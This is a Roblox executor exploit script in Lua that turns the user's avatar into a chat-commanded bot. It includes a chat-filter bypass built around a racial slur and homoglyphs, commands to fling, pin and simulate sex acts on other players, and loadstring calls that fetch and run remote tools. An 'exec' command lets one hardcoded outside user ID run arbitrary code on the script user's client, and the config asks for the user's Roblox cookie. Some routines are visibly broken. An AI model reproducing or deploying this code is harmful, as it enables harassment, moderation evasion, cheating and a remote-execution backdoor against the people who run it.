local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")
local PathfindingService = game:GetService("PathfindingService")
local TextService = game:GetService("TextService")
local localPlayer = Players.LocalPlayer


-----------------------------
-- Setup
-----------------------------

local defaultSettings = {	
	openrouteKey = "add here",
	robloxCookie = "add here",
	webhookUrl = "add here",
	prefix = "+",	
	ranks = {
		["10984088"] = 10,
		[tostring(localPlayer.UserId)] = 10,
	},
	rankList = {
		["0"] = "guest",
		["1"] = "user",
		["2"] = "admin",
		["3"] = "owner",
	}
}

local path = "vex/data/AdminSettings.json"
local settings = isfile(path) and HttpService:JSONDecode(readfile(path)) or defaultSettings

local EmoteTracks = {}
local AnimationIds = {
	wavehand = "rbxassetid://128777973", -- Example ID
	dance    = "rbxassetid://182491037", 
	laugh    = "rbxassetid://129423131", 
	cheer    = "rbxassetid://129423030"
}

-----------------------------
-- Util
-----------------------------

local function saveSettings()
	local json = HttpService:JSONEncode(settings)
	writefile(path, json)
end
saveSettings()

local function getRank(userId)
	return tonumber(settings.ranks[tostring(userId)]) or 0
end

local function bypass(text)
	local text = text:lower()

	local dictionary = {
		["@n"] = "nigga",
		["@c"] = "cock",
		["@f"] = "fuck",
		["@dc"] = "discord"
	}

	local conversionTableLower = {
		a = "ạ", b = "ḅ", c = "с", d = "ḍ", e = "ẹ",
		f = "f", g = "ɡ", h = "ḥ", i = "ị", j = "ј",
		k = "ḳ", l = "ḷ", m = "ṃ", n = "ṇ", o = "ọ",
		p = "р", q = "q", r = "ṛ", s = "ṣ", t = "ṭ",
		u = "ụ", v = "ṿ", w = "ẉ", x = "х", y = "ỵ", z = "ẓ", [" "] = "\r",
	}

	local translated = string.gsub(text, "@%w+", dictionary)
	local bypassed = string.gsub(string.gsub(translated, ".", "%0\xD8\x8D\b"), ".", conversionTableLower)

	return bypassed
end

local function chat(text)	
	task.spawn(function()
		TextChatService.TextChannels.RBXGeneral:SendAsync(text)
	end)
end

local function whisper(target, text)
	local id1 = math.min(localPlayer.UserId, target.UserId)
	local id2 = math.max(localPlayer.UserId, target.UserId)

	local channelName = "RBXWhisper:" .. id1 .. "_" .. id2
	local whisperChannel = TextChatService.TextChannels:FindFirstChild(channelName)

	if whisperChannel then
		whisperChannel:SendAsync(text)
	else
		chat("/whisper @" .. target.Name)

		local channel = TextChatService.TextChannels:WaitForChild(channelName, 5)
		if channel then
			whisper(target, text)
		end
	end
end

local function findPlayer(speaker, nameHint)
	local children = Players:GetPlayers()
	local lowerHint = string.lower(tostring(nameHint))

	if nameHint == "" or nameHint == nil then
		return speaker
	end

	if nameHint == "me" then
		return speaker
	end

	if nameHint == "random" then
		return children[math.random(1, #children)]
	end

	for _, player in pairs(children) do
		if string.sub(string.lower(player.Name), 1, #lowerHint) == lowerHint or
			string.sub(string.lower(player.DisplayName), 1, #lowerHint) == lowerHint then
			return player
		end
	end

	return nil
end

local function parseCommand(message)
	local undo = string.sub(message, 2, 3) == "un" and true
	local content = string.sub(message, undo and 4 or 2)
	local args = string.split(content, " ")
	local command = string.lower(args[1])

	table.remove(args, 1) 

	return command, args, undo
end

if localPlayer.Character then
	for name, id in pairs(AnimationIds) do
		local anim = Instance.new("Animation")
		anim.AnimationId = id
		EmoteTracks[name] = localPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(anim)
	end
end
localPlayer.CharacterAdded:Connect(function(char)
	for name, id in pairs(AnimationIds) do
		local anim = Instance.new("Animation")
		anim.AnimationId = id
		EmoteTracks[name] = char:WaitForChild("Humanoid"):LoadAnimation(anim)
	end
end)

-----------------------------
-- Main
-----------------------------

local conn
local carpetConn
local followConn
local track
local flingConn

local commands do
	commands = {}

	-----------------------------
	-- Tools
	-----------------------------
	commands.glue = {
		rank = 1,
		callback = function(speaker, args)
			local target = findPlayer(speaker, args[1])
			local root = target.Character.PrimaryPart
			chat("glue test")
			
			task.spawn(function()
				while RunService.Heartbeat:Wait() do
					if root then
						sethiddenproperty(localPlayer.Character.PrimaryPart, "PhysicsRepRootPart", root)
					else
						warn("stop")
						break
					end
				end
			end)
		end
	}
	
	commands.droptools = {
		rank = 1,
		callback = function()
			for _,v in next, localPlayer.Character:GetChildren() do
				if v:IsA("Tool") then
					if v.CanBeDropped then
						v.Parent = workspace
					else
						v.Parent = localPlayer:FindFirstChildOfClass("Backpack")
					end
				end
			end
		end
	}

	commands.usetools = {
		rank = 1,
		callback = function(speaker, args)
			local Backpack = localPlayer:FindFirstChildOfClass("Backpack")
			local amount = tonumber(args[1]) or 1
			local delay_ = tonumber(args[2]) or false

			for _, v in next, Backpack:GetChildren() do
				v.Parent = localPlayer.Character
				task.spawn(function()
					for _ = 1, amount do
						v:Activate()
						if delay_ then
							task.wait(delay_)
						end
					end
				end)

				v.Parent = Backpack
			end
		end
	}

	commands.equiptools = {
		rank = 1,
		callback = function()
			for _,v in next, localPlayer:FindFirstChildOfClass("Backpack"):GetChildren() do
				if v:IsA("Tool") or v:IsA("HopperBin") then
					v.Parent = localPlayer.Character
				end
			end
		end
	}

	-----------------------------
	-- Chat
	-----------------------------
	commands.bypass = {
		rank = 2,
		callback = function(speaker, args)
			chat(bypass(table.concat(args, " ")))
		end
	}

	commands.chat = {
		rank = 2,
		callback = function(speaker, args)
			chat(table.concat(args, " "))
		end
	}

	commands.follow = {
		rank = 1,
		callback = function(speaker, args)
			if _G.FollowLoop then
				task.cancel(_G.FollowLoop)
				_G.FollowLoop = nil
			end

			local targetPlayer = findPlayer(speaker, args[1])

			if not targetPlayer then return end

			_G.FollowLoop = task.spawn(function()
				while true do
					local localChar = localPlayer.Character
					local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
					local localHumanoid = localChar and localChar:FindFirstChild("Humanoid")

					local targetChar = targetPlayer.Character
					local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

					if localRoot and localHumanoid and targetRoot then
						local distance = (localRoot.Position - targetRoot.Position).Magnitude

						localHumanoid.Sit = false

						local path = PathfindingService:CreatePath({
							AgentRadius = 2,
							AgentHeight = 5,
							AgentCanJump = true,
							AgentCanClimb = true,
							WaypointSpacing = math.huge,
							Costs = {
								Water = 20
							}
						})

						local success, errorMessage = pcall(function()
							path:ComputeAsync(localRoot.Position, targetRoot.Position)
						end)

						if success  then
							local waypoints = path:GetWaypoints()

							if waypoints[3] then
								localHumanoid:MoveTo(waypoints[3].Position)
							elseif waypoints[2] then
								localHumanoid:MoveTo(waypoints[2].Position)
							end
						else
							localHumanoid:MoveTo(targetRoot.Position)
						end
					end
				end

				task.wait(0.05) 			
			end)
		end
		}


		commands.whisper = {
	rank = 2,
	callback = function(speaker, args)
		local target = findPlayer(speaker, args[1])
		table.remove(args, 1)

		whisper(target, table.concat(args, " "))
	end
}

commands.cmds = {
	rank = -999,
	callback = 	function(speaker, args)
		local list = {}			
		local rank = getRank(speaker.UserId)

		for name, data in next, commands do
			if rank < data.rank then
				continue
			end

			table.insert(list, name)
		end

		whisper(speaker, "Avaliable commands: " .. table.concat(list, ", "))
	end
}

commands.ai = {
	rank = 2,
	callback = function(speaker, args)
		local raw = settings.openrouteKey
		local KEY = raw == "add here" and nil or raw
		local URL = "https://openrouter.ai/api/v1/chat/completions"

		if not KEY then
			chat(`VEX: OpenRouter API key is missing from {path}`)
			return
		end

		local systemPrompt = [[
SYSTEM PROMPT:
Role: Roblox bot. Reply directly to the user with the chat message ONLY. Do not use filler like "Here is the response".

Constraints:
1. Hard Limit: Under 163 characters.
2. If input is inappropriate/NSFW: Reply exactly with "#####".
3. Never break character. Use internet slang, emojis and type in lowercase.
4. Users may chat in other languages other than english, so reply in the language their current message is.

Commands (Insert naturally into text):
- [walkTo:PlayerName]
- [emote:STYLE] 
- STYLE options: waveHand, dance, laugh, cheer

### EXAMPLES
User: Come here please!
Assistant: On my way! [walkTo:User]

User: Do you like this song?
Assistant: Yesss its a banger [emote:dance]

User: I hate you, you suck.
Assistant: #####

User: Go stand next to BaconHair123
Assistant: bet [walkTo:BaconHair123]

User: Write me a poem about the sunset and the birds singing.
Assistant: Thats way too long for roblox chat lol.

USER PROMPT:
]]

		local aiCommands = {

			emote = function(name)
				local track = EmoteTracks[name]

				if track then
					track:Play()
					-- Optional: Stop after 2 seconds so it doesn't loop forever
					task.delay(5, function() track:Stop() end) 
				else
					warn("Animation not found:", name)
				end
			end,

			-- Usage: [walkTo:PlayerName]
			walkto = function(targetName)
				local Humanoid = localPlayer.Character:FindFirstChild("Humanoid")
				local RootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")

				if followConn then
					followConn:Disconnect()
					followConn = nil
				end

				local targetPlayer = findPlayer(nil, targetName)
				if targetPlayer and targetPlayer.Character then
					local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
					if targetRoot then

						-- OR: Pathfinding (Better for mazes/obstacles)
						task.spawn(function()
							local path = PathfindingService:CreatePath({
								AgentRadius = 2,
								AgentHeight = 4,
								WaypointSpacing = math.huge,
								AgentCanJump = true,
								AgentCanClimb = true
							})
							path:ComputeAsync(RootPart.Position, targetRoot.Position)
							if path.Status == Enum.PathStatus.Success then
								for _, waypoint in pairs(path:GetWaypoints()) do
									Humanoid:MoveTo(waypoint.Position)
									Humanoid.MoveToFinished:Wait()
								end
							end
						end)
					end
				end
			end,

		}

		local function processAIResponse(responseText)
			for cmd, arg in responseText:gmatch("%[(%w+):?(%w*)%]") do
				local cmdEntry = aiCommands[cmd:lower()]
				if cmdEntry then
					cmdEntry(arg:lower())
				end
			end

			local cleanText = responseText:gsub("%[(.-)%]", "")
			return cleanText
		end


		local function askAI(prompt)
			local response = request({
				Url = URL,
				Method = "POST",
				Headers = {
					["Authorization"] = "Bearer " ..KEY,
					["Content-Type"] = "application/json",
					["X-Title"] = game.PlaceId
				},
				Body = HttpService:JSONEncode({
					model = "deepseek/deepseek-r1-0528:free",
					messages = {
						{ role = "user", content = systemPrompt ..prompt }
					},
				})
			})

			if response.Success then
				local data = game:GetService("HttpService"):JSONDecode(response.Body)
				if data.choices and data.choices[1].message.content then
					return processAIResponse(data.choices[1].message.content)
				end
			else
				for _,v in pairs(response) do
					warn(v)
				end

				chat("Error: Could not reach AI. ")
			end
		end

		local prompt = speaker.Name .. ": " ..table.concat(args, " ")
		if #prompt > 0 then
			chat("Loading...")
			local response = askAI(prompt)
			chat(string.sub(response, 0, 163))
		end
	end
}

-----------------------------
-- Character
-----------------------------
commands.die = {
	rank = 1,
	callback = function()
		replicatesignal(localPlayer.ConnectDiedSignalBackend)
		task.wait(Players.RespawnTime + 0.20)
		replicatesignal(localPlayer.Kill)
	end
}

commands.re = {
	rank = 1,
	callback = function()
		replicatesignal(localPlayer.Kill)
		replicatesignal(localPlayer.ConnectDiedSignalBackend)
		task.wait(Players.RespawnTime - 0.1)
		replicatesignal(localPlayer.Kill)	
	end
}

commands.fling = {
	rank = 1,
	callback = function(speaker, args)
		local target = findPlayer(speaker, args[1])

		local vel
		local movel = 10

		if flingConn then
			flingConn:Disconnect()
			flingConn = nil
		end

		flingConn = RunService.Heartbeat:Connect(function()
			local hrp = localPlayer.Character:FindFirstChild("HumanoidRootPart")
			local target = target.Character:FindFirstChild("HumanoidRootPart")

			if not hrp or not target then
				return
			end

			hrp.Parent.Humanoid.Sit = true

			for _,v in pairs(hrp.Parent:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
					v.Massless = true
				end
			end

			hrp.CFrame = target.CFrame * CFrame.new(0, 0, -10)
			vel = hrp.Velocity
			hrp.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)
			RunService.RenderStepped:Wait()
			hrp.Velocity = vel
			RunService.Stepped:Wait()
			hrp.Velocity = vel + Vector3.new(0, movel, 0)
			movel = -movel
		end)
	end,

	undo = function()
		localPlayer.Character.HumanoidRootPart.Anchored = true

		if flingConn then
			flingConn:Disconnect()
			flingConn = nil
		end

		localPlayer.Character.Humanoid.Sit = false
		localPlayer.Character.Torso.CanCollide = true

		for _,v in pairs(localPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.AssemblyLinearVelocity = Vector3.zero
				v.AssemblyAngularVelocity = Vector3.zero
			end
		end

		task.wait(0.1)

		for _,v in pairs(localPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.AssemblyLinearVelocity = Vector3.zero
				v.AssemblyAngularVelocity = Vector3.zero
			end
		end

		localPlayer.Character.HumanoidRootPart.Anchored = false
	end
}

commands.tp = {
	rank = 1,
	callback = function(speaker, args) 
		local character = localPlayer.Character

		if not character then 
			return 
		end

		local targetPlayer = findPlayer(speaker, args[1])

		if targetPlayer and targetPlayer.Character then
			local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
			if targetHRP then
				for _,v in pairs(character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.AssemblyLinearVelocity = Vector3.zero
						v.AssemblyAngularVelocity = Vector3.zero
					end
				end

				character:PivotTo(targetHRP.CFrame)
				character.Torso.CanCollide = true
				return
			end
		end

		if args[2] and args[3] and args[4] then
			local x = tonumber(args[2])
			local y = tonumber(args[3])
			local z = tonumber(args[4])

			if x and y and z then
				character:PivotTo(CFrame.new(x, y, z))
			end
		end
	end
}

commands.carpet = {
	rank = 1,
	callback = function(speaker, args)
		local targetPlayer = findPlayer(speaker, args[1])
		local char = localPlayer.Character
		local hum = char.Humanoid
		local root = char.HumanoidRootPart

		carpetConn = RunService.Heartbeat:Connect(function()
			local targetChar = targetPlayer.Character
			local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")

			if targetRoot and root then
				hum.Sit = false
				hum.PlatformStand = true

				for _,v in pairs(char:GetChildren()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
						v.Massless = true
						v.AssemblyLinearVelocity = Vector3.zero	
						v.AssemblyAngularVelocity = Vector3.zero
					end
				end


				local rawLook = targetRoot.CFrame.LookVector
				local flattenedLook = Vector3.new(rawLook.X, 0, rawLook.Z).Unit

				root.CFrame = CFrame.lookAt(root.CFRame, flattenedLook) 
					* CFrame.Angles(math.rad(90), 0, 0)

				targetRoot.AssemblyLinearVelocity = Vector3.zero	
				targetRoot.AssemblyAngularVelocity = Vector3.zero
			end
		end)
	end,
	undo = function(speaker, args)
		if carpetConn then
			carpetConn:Disconnect()
			carpetConn = nil
		end

		char.Torso.CanCollide = true
		hum.PlatformStand = false
	end
}

commands.bang = {
	rank = 1,
	callback = function(speaker, args)
		if conn then
			conn:Disconnect()
			conn = nil
		end

		if track then
			track:Stop()
		end

		local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://148840371"

		local speed = tonumber(args[2]) or 1

		track = humanoid:LoadAnimation(animation)

		local targetPlayer = findPlayer(speaker, args[1])

		if targetPlayer and targetPlayer.Character then
			track:Play()

			conn = RunService.Heartbeat:Connect(function()
				local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")

				if not track.IsPlaying then
					track = humanoid:LoadAnimation(animation)
				end

				if targetRoot then
					track:AdjustSpeed(speed)
					humanoid.Sit = false
					localPlayer.Character.HumanoidRootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 1)
				end
			end)
		end
	end,
	undo = function()
		if conn then
			conn:Disconnect()
			conn = nil
		end

		if track then
			track:Stop()
		end
	end,
}

commands.orbit = {
	rank = 3,
	callback = function()
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		local RootPart = Character:WaitForChild("HumanoidRootPart")

		-- SETTINGS
		local RADIUS = 30       -- How far away (in studs)
		local SPEED = 10         -- How fast they spin
		local HEIGHT_OFFSET = 5 -- How high off the ground relative to you

		if not getgenv().Network then
			getgenv().Network = {
				BaseParts = {},
				Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
			}

			Network.RetainPart = function(Part)
				if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
					table.insert(Network.BaseParts, Part)
					Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
					Part.CanCollide = false
				end
			end

			local function EnablePartControl()
				RunService.Heartbeat:Connect(function()
					LocalPlayer.ReplicationFocus = workspace
					LocalPlayer.ReplicationFocus = nil
					sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
					for _, Part in next, Network.BaseParts do
						if Part:IsDescendantOf(workspace) then
							Part.Velocity = Network.Velocity
						end
					end
				end)
			end

			EnablePartControl()
		end

		-- 1. Get valid parts
		local orbitingParts = {}

		local function isValidPart(part: Instance)			
			if not part:IsA("BasePart") then return false end

			if part.Anchored == true then return false end

			if part:IsA("Terrain") then return false end

			if part.Parent == LocalPlayer.Character or part:IsDescendantOf(LocalPlayer.Character) then
				return false
			end

			return true
		end

		-- Collect parts from Workspace
		task.spawn(function()
			while task.wait(0.5) do
				for _, part in next, workspace:GetDescendants() do
					if isValidPart(part) then
						table.insert(orbitingParts, part)

						part.CanCollide = false 
						part.Massless = true
					else 
						local i = table.find(orbitingParts, part)
						if i then
							table.remove(orbitingParts, i)
						end
					end
				end
			end
		end)

		RunService.RenderStepped:Connect(function()
			local currentTime = tick() * SPEED

			if not RootPart then return end

			for index, part in next, orbitingParts do
				if part and part.Parent then

					local angleOffset = (index / #orbitingParts) * (math.pi * 2)

					local currentAngle = currentTime + angleOffset

					-- Calculate X and Z based on angle (Circle Math)
					local x = math.cos(currentAngle) * RADIUS
					local z = math.sin(currentAngle) * RADIUS

					-- Set new position relative to your RootPart
					local newCFrame = CFrame.new(
						RootPart.Position.X + x,
						RootPart.Position.Y + HEIGHT_OFFSET,
						RootPart.Position.Z + z
					)

					part.CFrame = newCFrame * CFrame.Angles(currentTime, currentTime, 0)
					part.AssemblyLinearVelocity = Vector3.zero
					part.AssemblyAngularVelocity = Vector3.zero
				else
					table.remove(orbitingParts, index)
				end
			end
		end)
	end
}

commands.god = {
	rank = 1,
	callback = function()
		local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
			local method = getnamecallmethod()
			-- If the game tries to fire a touch event or check for one, we block it
			if method == "FireTouchInterest" then
				return nil 
			end
			return oldNamecall(self, ...)
		end)
	end
}
-----------------------------
-- Internal
-----------------------------

commands.ranks = {
	rank = 0,
	callback = function(speaker, args)
		local message = "Available Ranks: "
		local items = {}

		for level, name in pairs(settings.rankList) do
			table.insert(items, string.format("%s (%d) ", name, level))
		end

		message = message .. table.concat(items, ", ")

		whisper(speaker, message)
	end
}

commands.rank = {
	rank = 0,
	callback = function(speaker, args)
		local target = findPlayer(speaker, args[1])
		local rank = tostring(getRank(target.UserId))
		local name = settings.rankList[rank] or "nil"

		if target then
			whisper(speaker, `{target.DisplayName}'s rank is: {name} ({rank})`)
		end
	end
}

commands.setrank = {
	rank = 3,
	callback = function(speaker, args)
		local speakerRank = getRank(speaker.UserId)
		local target = findPlayer(speaker, args[1])
		local userId

		if target then
			userId = target.UserId
		else
			userId = tonumber(args[1])
		end

		if not userId then return end

		local targetCurrentRank = getRank(userId)
		local newRankLevel = tonumber(args[2])

		if newRankLevel >= speakerRank then
			return
		end

		if targetCurrentRank >= speakerRank then
			return
		end

		settings.ranks[tostring(userId)] = newRankLevel < 1 and nil or tostring(newRankLevel)
		saveSettings()

		if target then
			local name = settings.rankList[tostring(newRankLevel)] or "nil"
			whisper(target, `You've been ranked to: {name} ({newRankLevel})`)
		end
	end
}

commands.rejoin = {
	rank = 3,
	callback = function(speaker)
		if speaker.UserId == 10984088 or speaker.UserId == 4912844218 then
			chat("Rejoining...")
			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
		end
	end
}	

commands.dex = {
	rank = 3,
	callback = function(speaker)
		if speaker.UserId == 10984088 then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Save-scripts/refs/heads/main/DexMobile.lua"))()	
		end
	end
}

commands.rspy = {
	rank = 3,
	callback = 	function(speaker)
		if speaker.UserId == 10984088 then
			loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
		end
	end
}

commands.exec = {
	rank = 3,
	callback = function(speaker, args)
		if speaker.UserId == 10984088 then
			local code = table.concat(args, " ")
			local executable, compileError = loadstring(code)

			if not executable then
				warn("Script Error:", compileError)
				return
			end

			local customEnv = {
				localPlayer = localPlayer,
				chat = chat,
				whisper = whisper,
				speaker = speaker,
				script = script 
			}

			setmetatable(customEnv, {
				__index = getfenv() 
			})

			setfenv(executable, customEnv)
			executable() 
		end
	end
}
end

local function onMessageReceived(message)
	local prefix = string.sub(message.Text, 0, 1)

	if prefix ~= settings.prefix then
		return
	end

	local speaker = Players:GetPlayerByUserId(message.TextSource and message.TextSource.UserId)
	local name, args, undo = parseCommand(message.Text)
	local cmd = commands[name]

	local rank = getRank(speaker.UserId)

	if rank < cmd.rank then return end

	local callback = not undo and cmd.callback or cmd.undo

	if callback then
		callback(speaker, args)
	end
end

TextChatService.MessageReceived:Connect(onMessageReceived)
